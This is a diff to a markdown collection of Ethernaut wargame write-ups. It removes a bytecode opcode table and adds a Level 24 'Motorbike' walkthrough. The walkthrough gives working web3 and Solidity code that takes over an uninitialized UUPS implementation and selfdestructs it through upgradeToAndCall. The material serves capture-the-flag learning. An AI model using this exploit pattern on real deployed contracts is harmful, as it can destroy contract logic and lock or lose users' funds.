@@ -1009,47 +1009,6 @@ After calling `destroy()`, check the wallet balance
 
 ---
 
-## Opcode Breakdown
-
-### Runtime Bytecode (10 bytes)
-This is the actual logic that gets executed when the `solver` contract is called.
-
-| Opcode | Meaning                        |
-|--------|--------------------------------|
-| 602a   | PUSH1 0x2a (value 42)          |
-| 6050   | PUSH1 0x50 (mem pos 0x50)      |
-| 52     | MSTORE                         |
-| 6020   | PUSH1 0x20 (length = 32 bytes) |
-| 6050   | PUSH1 0x50 (same mem pos)      |
-| f3     | RETURN                         |
-
-Final Runtime: `602a60505260206050f3` (10 bytes)
-
----
-
-### Init Code (Setup code)
-This is the code run during deployment to install the runtime code above in the new contract.
-
-| Opcode | Meaning                                  |
-|--------|------------------------------------------|
-| 600a   | PUSH1 0x0a (size of runtime)             |
-| 600c   | PUSH1 0x0c (offset to runtime code)      |
-| 6000   | PUSH1 0x00 (dest in memory)              |
-| 39     | CODECOPY                                 |
-| 600a   | PUSH1 0x0a (size of runtime)             |
-| 6000   | PUSH1 0x00 (mem pos of runtime code)     |
-| f3     | RETURN                                   |
-
-Final Init Code: `600a600c600039600a6000f3` (12 bytes)
-
----
-
-### Final Bytecode (22 bytes total)
-
-```
-600a600c600039600a6000f3602a60505260206050f3
-```
-
 ### 1. Deploy Contract from Raw Bytecode
 
 Open the browser console on the Ethernaut level page and paste:
@@ -1563,6 +1522,108 @@ At this point, the player is the **admin** of the proxy, and they can control th
 ### Level Completed
 ![Level Complete Output](assets/puzzlewallet1.png)
 ![2](assets/puzzlewallet2.png)
+
+
+# Ethernaut Level 24: **Motorbike**
+
+### Strategy
+
+This level involves exploiting a **UUPS proxy pattern** (EIP-1967), where the proxy (Motorbike) delegates calls to its implementation (Engine). The vulnerability arises because the logic contract, `Engine`, was never **initialized**, allowing us to take over upgrade rights and **selfdestruct** the Engine.
+The goal is to:
+* Initialize the Engine contract (which was mistakenly not initialized).
+* Become the upgrader.
+* Call `upgradeToAndCall()` to set a malicious implementation that selfdestructs.
+
+---
+
+### Vulnerability Summary
+#### Key Insight:
+* **Initializable** uses storage slot `0`, but since Motorbike initialized Engine via a `delegatecall`, the initializer affected Motorbike’s storage instead.
+* Engine remains **uninitialized**, allowing anyone to call `initialize()` directly.
+
+#### Observations:
+```solidity
+bytes32 internal constant _IMPLEMENTATION_SLOT = 
+    bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
+```
+* The `upgradeToAndCall()` function can be called once you become the upgrader.
+* A malicious contract can be passed to this function, which uses `delegatecall`, so `selfdestruct` will affect the Engine contract itself.
+
+---
+
+### Exploit Steps
+#### 1. Get the Engine address
+
+```js
+const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
+const engineAddress = await web3.eth.getStorageAt(contract.address, _IMPLEMENTATION_SLOT);
+```
+
+#### 2. Call `initialize()` on Engine
+```js
+await web3.eth.sendTransaction({
+  from: player,
+  to: engineAddress,
+  data: '0x8129fc1c' // initialize()
+});
+```
+You now become the `upgrader`.
+
+#### 3. Deploy a malicious contract
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity <0.7.0;
+
+contract Pwner {
+  function pwn() public {
+    selfdestruct(address(0));
+  }
+}
+```
+
+Deploy `Pwner`, and get its address
+
+#### 4. Craft call to `upgradeToAndCall`
+```js
+const _function = {
+  "inputs": [
+    { "name": "newImplementation", "type": "address" },
+    { "name": "data", "type": "bytes" }
+  ],
+  "name": "upgradeToAndCall", 
+  "type": "function"
+};
+
+const _parameters = [
+  '0xad3359eAbEec598f7eBEDdb14BC056ca57fa32B1', // Pwner contract
+  '0xdd365b8b' // pwn()
+];
+
+const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
+
+await web3.eth.sendTransaction({
+  from: player,
+  to: engineAddress,
+  data: _calldata
+});
+```
+This destroys the `Engine` logic contract by executing `selfdestruct` via `delegatecall`.
+
+---
+
+### Verify Completion
+
+You can verify on Etherscan or with code:
+```js
+// Check if the Engine code is empty
+const code = await web3.eth.getCode(engineAddress);
+console.log(code); // Should be '0x'
+```
+
+---
+
+### Level Completed
+![Level Complete](assets/motorbike_complete.png)
 
 
 # Ethernaut Level 27: Good Samaritan
